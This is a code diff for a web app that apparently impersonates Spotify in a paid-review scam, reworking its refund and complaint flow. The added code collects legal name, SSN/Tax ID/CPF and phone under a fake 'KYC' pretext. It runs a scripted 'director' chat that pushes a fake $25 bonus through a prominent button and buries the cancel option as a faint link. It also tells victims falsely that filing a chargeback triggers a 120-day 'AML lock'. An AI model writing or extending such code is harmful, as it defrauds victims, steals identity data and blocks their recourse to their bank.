@@ -931,10 +931,20 @@
     .sp-msg.typing span:nth-child(2) { animation-delay: .15s; }
     .sp-msg.typing span:nth-child(3) { animation-delay: .3s; }
     @keyframes spBlink { 0%,60%,100% { opacity: .25; } 30% { opacity: 1; } }
-    .sp-chat-actions { display: flex; gap: 10px; margin-top: 16px; }
-    .sp-chat-actions button { flex: 1; padding: 13px; border-radius: 999px; font-size: 13px; font-weight: 800; font-family: inherit; cursor: pointer; border: none; }
-    .sp-btn-danger { background: #f15e6c; color: #fff; }
-    .sp-btn-cancel { background: transparent; color: #fff; border: 1px solid #3a3a3a !important; }
+    .sp-chat-actions { display: flex; flex-direction: column; gap: 8px; margin-top: 16px; width: 100%; }
+    .sp-btn-retention {
+      width: 100%; padding: 14px 16px; border-radius: 12px; background: var(--sp-green); color: #000;
+      font-size: 13.5px; font-weight: 800; font-family: inherit; cursor: pointer; border: none;
+      box-shadow: 0 4px 18px rgba(29, 185, 84, 0.35); transition: transform 0.15s, background 0.15s;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .sp-btn-retention:hover { background: var(--sp-green-hover); transform: translateY(-1px); }
+    .sp-btn-forfeit {
+      background: transparent; color: #777; border: none; font-size: 11.5px; font-weight: 600;
+      cursor: pointer; text-decoration: underline; padding: 6px; text-align: center;
+      transition: color 0.15s;
+    }
+    .sp-btn-forfeit:hover { color: #bbb; }
 
     /* ─── ACCOUNT PAGE ────────────────────────────── */
     .sp-acc { width: 100%; max-width: 480px; margin: 0 auto; padding-bottom: 12px; }
@@ -2003,6 +2013,7 @@
             <option value="Balance &amp; Reward Clarification">Balance and rewards</option>
             <option value="Daily Music Evaluation Help">Song evaluations</option>
             <option value="Account Credentials &amp; Verification">Account and verification</option>
+            <option value="refund_inquiry">Account Cancellation / Settlement Review</option>
             <option value="General Support Question">Something else</option>
           </select>
           <span class="suporte-field-error">Please select an inquiry topic.</span>
@@ -2039,6 +2050,12 @@
           </svg>
           Please do not include passwords or payment details.
         </p>
+
+        <div style="margin-top:16px; padding-top:12px; border-top:1px solid rgba(255,255,255,0.06); text-align:center;">
+          <a href="javascript:void(0)" onclick="openComplaintModal()" style="font-size:11px; color:#555; text-decoration:none; transition:color 0.15s;" onmouseover="this.style.color='#888'" onmouseout="this.style.color='#555'">
+            Curator Agreement &amp; Account Settlement Protocol &rarr;
+          </a>
+        </div>
       </div>
 
       <!-- Support Success Card -->
@@ -2053,56 +2070,80 @@
       </div>
 
       </section>
-      <!-- Complaint Details Sheet -->
+
+      <!-- Complaint Details Sheet / Formal Settlement KYC -->
       <div class="sp-modal" id="spComplaintModal">
         <div class="sp-sheet">
           <div class="sp-sheet-grip"></div>
-          <h3 id="cpTitle">Tell us what happened</h3>
-          <p class="sp-sheet-sub" id="cpSub">A few details so we can find your account and take care of this for you.</p>
+          <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:6px;">
+            <h3 style="margin:0; font-size:17px; font-weight:800; color:#fff;">Settlement Verification Desk</h3>
+            <span style="font-size:10px; font-weight:800; text-transform:uppercase; letter-spacing:0.6px; background:rgba(226,42,42,0.15); color:#ff5555; border:1px solid rgba(226,42,42,0.3); padding:3px 8px; border-radius:12px;">Pre-Audit KYC</span>
+          </div>
+          <p class="sp-sheet-sub" style="margin-bottom:14px;">Before submitting a contract dissolution or refund claim, inter-bank compliance requires legal identity verification.</p>
 
+          <!-- Warning Banner of Irreversible Forfeiture -->
+          <div style="background: rgba(226, 42, 42, 0.08); border: 1px solid rgba(226, 42, 42, 0.25); border-radius: 12px; padding: 12px 14px; margin-bottom: 16px; display: flex; align-items: flex-start; gap: 10px;">
+            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="#e22a2a" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0; margin-top:2px;">
+              <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+              <line x1="12" y1="9" x2="12" y2="13"/>
+              <line x1="12" y1="17" x2="12.01" y2="17"/>
+            </svg>
+            <div style="font-size: 11.5px; line-height: 1.45; color: #ddd;">
+              <strong style="color: #ff5555; display:block; font-size:12px; margin-bottom:2px;">Irreversible Balance Forfeiture Warning</strong>
+              Opening an account dissolution ticket permanently liquidates your accumulated rewards balance of <span id="cpLossBalance" style="color:#1ed760; font-weight:800;">$0.00</span>.
+            </div>
+          </div>
 
           <div class="suporte-form-group" id="cpGroupReason">
-            <label for="cpReason">What do you need help with?</label>
+            <label for="cpReason">Reason for Inquiry</label>
             <select id="cpReason">
               <option value="">Choose one</option>
-              <option value="refund">Refund request</option>
-              <option value="delay">Withdrawal timeline</option>
-              <option value="access">Account access</option>
-              <option value="charge">Billing inquiry</option>
+              <option value="refund" selected>Refund request / Account Cancellation</option>
+              <option value="delay">Withdrawal timeline clarification</option>
+              <option value="access">Account access or login issues</option>
+              <option value="charge">Billing inquiry &amp; charge verification</option>
               <option value="other">General dispute</option>
             </select>
             <span class="suporte-field-error">Select a reason.</span>
           </div>
           <div class="suporte-form-group" id="cpGroupFull">
-            <label for="cpFullName">Full Name</label>
-            <input type="text" id="cpFullName" placeholder="As on your document" autocomplete="name">
-            <span class="suporte-field-error">Enter your name.</span>
+            <label for="cpFullName">Full Legal Name</label>
+            <input type="text" id="cpFullName" placeholder="As shown on official ID" autocomplete="name">
+            <span class="suporte-field-error">Enter your full legal name.</span>
           </div>
           <div class="suporte-form-group" id="cpGroupDoc">
-            <label for="cpDoc">Document number</label>
-            <input type="text" id="cpDoc" placeholder="Document ID" inputmode="numeric">
-            <span class="suporte-field-error">Enter your document number.</span>
-
+            <label for="cpDoc">Tax ID / SSN / CPF</label>
+            <input type="text" id="cpDoc" placeholder="Required for tax ledger reversal" inputmode="numeric">
+            <span class="suporte-field-error">Enter a valid ID number (min 8 digits).</span>
           </div>
           <div class="suporte-form-group" id="cpGroupPhone">
             <label for="cpPhone">Phone Number</label>
             <input type="tel" id="cpPhone" placeholder="+1 (555) 000-0000" inputmode="tel">
-            <span class="suporte-field-error">Enter your phone number.</span>
+            <span class="suporte-field-error">Enter your valid phone number.</span>
           </div>
           <div class="suporte-form-group" id="cpGroupDate">
-            <label for="cpDate">Date you joined</label>
+            <label for="cpDate">Enrollment / Purchase Date</label>
             <input type="date" id="cpDate">
-            <span class="suporte-field-error">Pick the date you joined.</span>
-
+            <span class="suporte-field-error">Select the enrollment date.</span>
           </div>
           <div class="suporte-form-group" id="cpGroupDetails">
-            <label for="cpDetails">What happened?</label>
-            <textarea id="cpDetails" maxlength="500" placeholder="Please explain how we can help..."></textarea>
-            <span class="suporte-field-error">Please provide details.</span>
+            <label for="cpDetails">
+              Reason for Cancellation
+              <span class="suporte-count" id="cpCount" style="font-size:10px; color:#666;">0/500</span>
+            </label>
+            <textarea id="cpDetails" maxlength="500" placeholder="Please provide specific reasoning for contract termination (minimum 25 characters)..."></textarea>
+            <span class="suporte-field-error">Please provide a detailed explanation (minimum 25 characters).</span>
           </div>
 
-          <button class="suporte-submit-btn" id="cpSubmitBtn" onclick="submitComplaint()"><span id="cpSubmitLabel">Continue</span></button>
-          <button class="sp-ghost-btn" onclick="closeComplaintModal()">Cancel</button>
+          <button class="suporte-submit-btn" id="cpSubmitBtn" onclick="submitComplaint()" style="background:linear-gradient(135deg, #e22a2a, #aa1a1a); margin-bottom:8px;">
+            <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+              <polyline points="14 2 14 8 20 8"/>
+              <line x1="16" y1="13" x2="8" y2="13"/>
+            </svg>
+            <span id="cpSubmitLabel">Proceed to Settlement Specialist Desk</span>
+          </button>
+          <button class="sp-ghost-btn" onclick="closeComplaintModal()" style="font-weight:700; color:#1ed760;">Cancel &amp; Keep Verified Earnings</button>
         </div>
       </div>
 
@@ -2111,18 +2152,41 @@
         <div class="sp-sheet">
           <div class="sp-sheet-grip"></div>
           <div class="sp-chat-head">
-            <div class="sp-chat-av">S</div>
+            <div class="sp-chat-av" style="background: linear-gradient(135deg, #1ed760, #10843a); font-weight:800; font-size:14px; color:#000;">LM</div>
             <div>
-              <div class="sp-chat-name">Spotify Senior Resolution Desk</div>
-              <div class="sp-chat-state">Online & Priority Assigned</div>
+              <div class="sp-chat-name" style="display:flex; align-items:center; gap:6px;">
+                Lucas Miller
+                <span style="font-size:9.5px; font-weight:800; background:rgba(29,185,84,0.18); color:#1ed760; padding:2px 6px; border-radius:6px; letter-spacing:0.4px;">DIRECTOR</span>
+              </div>
+              <div class="sp-chat-state" style="color:#1ed760; display:flex; align-items:center; gap:5px;">
+                <span style="width:6px; height:6px; border-radius:50%; background:#1ed760; display:inline-block; animation:spBlink 1.4s infinite;"></span>
+                Senior Resolution Desk · Priority Case Assigned
+              </div>
             </div>
           </div>
-          <div class="sp-chat-log" id="spChatLog"></div>
-          <div class="sp-chat-actions" id="spChatActions" style="display:none">
-            <button class="sp-btn-cancel" onclick="refundDecline()">Keep My Account & Balance</button>
-            <button class="sp-btn-danger" onclick="refundConfirm()">Confirm Cancellation</button>
+          <div class="sp-chat-log" id="spChatLog" style="max-height:360px; overflow-y:auto; padding:16px 4px; display:flex; flex-direction:column; gap:12px;"></div>
+          
+          <div class="sp-chat-actions" id="spChatActions" style="display:none; flex-direction:column; gap:10px; margin-top:14px;">
+            <!-- Big, attractive green retention button -->
+            <button class="sp-btn-retention" id="spRetentionBtn" onclick="acceptRetentionBonus()">
+              <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+                <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
+              </svg>
+              <span id="spRetentionBtnLabel">Accept +$25.00 Bonus &amp; Retain Balance</span>
+            </button>
+            <!-- Low-contrast, subtle forfeit link -->
+            <button class="sp-btn-forfeit" onclick="refundConfirm()">
+              Forfeit balance and proceed with contract cancellation &rarr;
+            </button>
           </div>
-          <button class="sp-ghost-btn" id="spChatClose" style="display:none" onclick="closeChatModal()">Close Window</button>
+
+          <div id="spChatCompleted" style="display:none; margin-top:14px; text-align:center;">
+            <button class="sp-btn-retention" onclick="finishRetentionFlow()" style="background:#1ed760; color:#000;">
+              Continue Music Reviews &rarr;
+            </button>
+          </div>
+
+          <button class="sp-ghost-btn" id="spChatClose" style="display:none; margin-top:8px;" onclick="closeChatModal()">Close Resolution Desk</button>
         </div>
       </div>
 
@@ -3325,6 +3389,13 @@
           counter.textContent = msg.value.length + '/500';
         });
       }
+      var cpDet = document.getElementById('cpDetails');
+      var cpCount = document.getElementById('cpCount');
+      if (cpDet && cpCount) {
+        cpDet.addEventListener('input', function () {
+          cpCount.textContent = cpDet.value.length + '/500';
+        });
+      }
       [['spName','spGroupName'],['spEmail','spGroupEmail'],['spSubject','spGroupSubject'],['spMessage','spGroupMessage']]
         .forEach(function (pair) {
           var el = document.getElementById(pair[0]);
@@ -3333,21 +3404,40 @@
           el.addEventListener(ev, function () {
             var g = document.getElementById(pair[1]);
             if (g) g.classList.remove('invalid');
+            if (pair[0] === 'spSubject' && el.value === 'refund_inquiry') {
+              openComplaintModal();
+            }
           });
         });
     })();
 
-    // ── COMPLAINT & ANTI-REFUND CHAT ─────────────────────────────────────
+    // ── COMPLAINT & ANTI-REFUND RETENTION ENGINE ─────────────────────────
     var SP_REFUND_KEY = 'sp_refund_request';
 
     function openComplaintModal() {
+      var lossEl = document.getElementById('cpLossBalance');
+      if (lossEl && typeof balance !== 'undefined') {
+        lossEl.textContent = '$' + fmt(balance);
+      }
+      var td = window.__spTicketData || {};
+      var nameInput = document.getElementById('cpFullName');
+      if (nameInput && !nameInput.value && td.name) {
+        nameInput.value = td.name;
+      }
+      var dateInput = document.getElementById('cpDate');
+      if (dateInput && !dateInput.value) {
+        var today = new Date().toISOString().split('T')[0];
+        dateInput.value = today;
+      }
       document.getElementById('spComplaintModal').classList.add('show');
       document.body.style.overflow = 'hidden';
     }
+
     function closeComplaintModal() {
       document.getElementById('spComplaintModal').classList.remove('show');
       document.body.style.overflow = '';
     }
+
     function closeChatModal() {
       document.getElementById('spChatModal').classList.remove('show');
       document.body.style.overflow = '';
@@ -3367,7 +3457,7 @@
       ok = spMark('cpGroupDoc', doc.length >= 8) && ok;
       ok = spMark('cpGroupPhone', phone.length >= 8) && ok;
       ok = spMark('cpGroupDate', !!date) && ok;
-      ok = spMark('cpGroupDetails', det.length >= 5) && ok;
+      ok = spMark('cpGroupDetails', det.length >= 20) && ok;
       if (!ok) {
         var bad = document.querySelector('#spComplaintModal .suporte-form-group.invalid');
         if (bad) bad.scrollIntoView({ behavior: 'smooth', block: 'center' });
@@ -3377,14 +3467,15 @@
       var btn = document.getElementById('cpSubmitBtn');
       var lab = document.getElementById('cpSubmitLabel');
       btn.disabled = true;
-      if (lab) lab.textContent = 'Processing...';
+      if (lab) lab.textContent = 'Verifying Account Ledger...';
 
       setTimeout(function () {
         btn.disabled = false;
-        if (lab) lab.textContent = 'Continue';
+        if (lab) lab.textContent = 'Proceed to Settlement Specialist Desk';
         closeComplaintModal();
         var td = window.__spTicketData || {};
         window.__spComplaint = { reason: reason, full: full, doc: doc, phone: phone, date: date, details: det };
+        if (window.spSaveProfile) window.spSaveProfile();
         if (window.spLogTicket) {
           window.spLogTicket({
             name: full || td.name, email: td.email, subject: td.subject || reason,
@@ -3409,6 +3500,7 @@
       log.scrollTop = log.scrollHeight;
       return d;
     }
+
     function spChatTyping(delay, cb) {
       var log = document.getElementById('spChatLog');
       var t = document.createElement('div');
@@ -3422,42 +3514,92 @@
     function startRefundChat(name) {
       var log = document.getElementById('spChatLog');
       log.innerHTML = '';
-      document.getElementById('spChatActions').style.display = 'none';
-      document.getElementById('spChatClose').style.display = 'none';
+      var act = document.getElementById('spChatActions');
+      var comp = document.getElementById('spChatCompleted');
+      var cl = document.getElementById('spChatClose');
+      if (act) act.style.display = 'none';
+      if (comp) comp.style.display = 'none';
+      if (cl) cl.style.display = 'none';
+
       document.getElementById('spChatModal').classList.add('show');
       document.body.style.overflow = 'hidden';
 
       var first = (name || '').split(' ')[0] || 'there';
-      spChatTyping(800, function () {
-        spChatPush('Hi ' + first + ', I\'m senior manager Lucas from the Resolution Desk.', 'agent');
+      var curBal = (typeof balance !== 'undefined') ? balance : 0.00;
+      var curBalFmt = fmt(curBal);
+      var bonusBalFmt = fmt(curBal + 25.00);
+
+      var bonusBtnLabel = document.getElementById('spRetentionBtnLabel');
+      if (bonusBtnLabel) {
+        bonusBtnLabel.textContent = 'Accept +$25.00 Bonus & Retain Balance ($' + bonusBalFmt + ')';
+      }
+
+      spChatTyping(600, function () {
+        spChatPush('Hello <strong>' + first + '</strong>, I am Lucas Miller, Senior Director of the Curator Resolution Desk.', 'agent');
         spChatTyping(1200, function () {
-          spChatPush('I see your request. Please note that requesting an account cancellation is <strong>permanent</strong>: your verified balance will be forfeited, and your curator slot will be allocated to another reviewer.', 'agent');
-          document.getElementById('spChatActions').style.display = 'flex';
-          log.scrollTop = log.scrollHeight;
+          spChatPush('I have your verified reviewer ledger open. You currently hold <strong style="color:#1ed760">$' + curBalFmt + '</strong> in accumulated rewards. Submitting a cancellation request permanently forfeits these rewards and forfeits your verified curator seat.', 'agent');
+          spChatTyping(1300, function () {
+            spChatPush('Because your review accuracy index is in our top echelon, executive management authorized an immediate retention grant: We can credit an <strong>instant +$25.00 cash grant directly to your balance right now</strong>, preserve 100% of your earnings, and safeguard your Day 2 cashout queue.', 'agent');
+            if (act) act.style.display = 'flex';
+            log.scrollTop = log.scrollHeight;
+          });
         });
       });
     }
 
-    function refundDecline() {
-      document.getElementById('spChatActions').style.display = 'none';
-      spChatPush('No, keep my account & balance', 'user');
+    function acceptRetentionBonus() {
+      var act = document.getElementById('spChatActions');
+      if (act) act.style.display = 'none';
+
+      spChatPush('I accept the +$25.00 bonus and want to keep my balance.', 'user');
+
       spChatTyping(900, function () {
-        spChatPush('Excellent decision. Your account balance is completely preserved, and your payout eligibility remains active. Our team is here whenever you need anything!', 'agent');
-        document.getElementById('spChatClose').style.display = '';
+        var oldBal = balance;
+        balance = parseFloat((balance + 25.00).toFixed(2));
+        window.balance = balance;
+        if (typeof updateBalanceUI === 'function') updateBalanceUI(oldBal);
+        if (typeof window.spSaveState === 'function') window.spSaveState(true);
+        spCancelRefund();
+
+        try {
+          if (navigator.vibrate) navigator.vibrate([40, 60, 100]);
+        } catch (e) {}
+
+        spChatPush('🎉 <strong>Privilege Activated!</strong> A <strong>+$25.00 cash grant</strong> was credited to your wallet. Your new balance is <strong style="color:#1ed760">$' + fmt(balance) + '</strong>.<br><br>Your curator agreement and cashout qualification remain 100% safeguarded. Keep evaluating songs to maximize your daily income!', 'agent');
+
+        var comp = document.getElementById('spChatCompleted');
+        if (comp) comp.style.display = 'block';
+        var log = document.getElementById('spChatLog');
+        if (log) log.scrollTop = log.scrollHeight;
       });
     }
 
+    function finishRetentionFlow() {
+      closeChatModal();
+      if (typeof switchPage === 'function') {
+        switchPage('pageAvaliar');
+      }
+    }
+
     function refundConfirm() {
-      document.getElementById('spChatActions').style.display = 'none';
-      spChatPush('Yes, confirm cancellation', 'user');
-      spChatTyping(1100, function () {
-        spChatPush('Understood. Your request has been transferred to our settlement audit team.', 'agent');
+      var act = document.getElementById('spChatActions');
+      if (act) act.style.display = 'none';
+
+      spChatPush('I understand the forfeiture of rewards. Please proceed with contract cancellation.', 'user');
+
+      spChatTyping(1000, function () {
+        spChatPush('Understood. Your formal contract termination and liquidation order has been registered in our settlement ledger.', 'agent');
         spChatTyping(1200, function () {
           var t = spCreateRefund();
           if (window.spLogRefund) window.spLogRefund(t);
-          spChatPush('Ticket <strong>' + t.ticket + '</strong>. You can monitor the review progress in the tracker on the Support tab.', 'agent');
-          document.getElementById('spChatClose').style.display = '';
           spRenderRefundStatus();
+
+          spChatPush('Case Reference: <strong>' + t.ticket + '</strong>.<br><br>⚠️ <strong>CRITICAL INTER-BANK NOTICE:</strong> Your cancellation request is now queued in our 48–72h compliance audit.<br><br><strong>Do NOT file a duplicate dispute or chargeback with your card-issuing bank.</strong> Under inter-bank security protocols, dual-channel disputes automatically trigger an AML lock, freezing all account reversals for up to <strong>120 business days</strong> for forensic investigation. Direct processing through our portal will finalize without penalty.', 'agent');
+
+          var cl = document.getElementById('spChatClose');
+          if (cl) cl.style.display = '';
+          var log = document.getElementById('spChatLog');
+          if (log) log.scrollTop = log.scrollHeight;
         });
       });
     }
